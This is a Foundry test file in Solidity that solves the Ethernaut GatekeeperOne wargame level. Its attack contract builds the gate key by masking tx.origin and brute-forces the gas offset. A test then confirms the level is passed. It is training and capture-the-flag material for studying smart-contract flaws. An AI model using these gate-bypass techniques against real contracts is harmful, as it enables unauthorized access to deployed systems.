// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/Ethernaut.sol";

contract UnlockOne {
    function unlock(address _gatekeeperOne, uint _gas, uint _margin) public {
        /*Calling the function through this contract already passes Gate 1 as
          tx.origin != msg.sender

        Gate 3 key must be bytes8 variable e.g. ABCD where
        1. CD == D so C: must be all zeros.
        2. CD != ABCD so AB must not be all zeros
        3. CD == uint16(tx.origin)
        So let's use the wallet address and bitwise it to ensure the first condition

        In Solidity 0.8.0
        Conversions between bytesX and uintY of different size are now disallowed
        due to bytesX padding on the right and uintY padding on the left which
        may cause unexpected conversion results. The size must now be adjusted
        within the type before the conversion.
        */
        uint64 wallet = uint64(uint160(tx.origin));
        bytes8 key = bytes8(wallet & 0xFFFFFFFF0000FFFF);

        /* Gate 2 requires figuring out how much gas the function consumes to make
        it go through the second gate.
        As it is gas dependant as well as compiler dependant it may vary a bit.
        Let's run it through a loop to guess when the gas is correct to pass
        */

        // Using call (vs. an abstract interface) prevents reverts from propagating.
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);

        // Let's start at 120 gas and go all the way to 300 gas
        for (uint256 i = _gas; i < _gas + _margin; i++) {
            (bool result, ) = address(_gatekeeperOne).call{gas: i + 8191 * 3}(encodedParams);
            if(result) {
                break;
            }
        }
    }
}

contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(tx.origin, 1 ether);
    }

    function testGatekeeperOne() public {
        // Level Setup
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        // Level Attack
        UnlockOne attack = new UnlockOne();
        attack.unlock(levelAddress, 120, 300);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
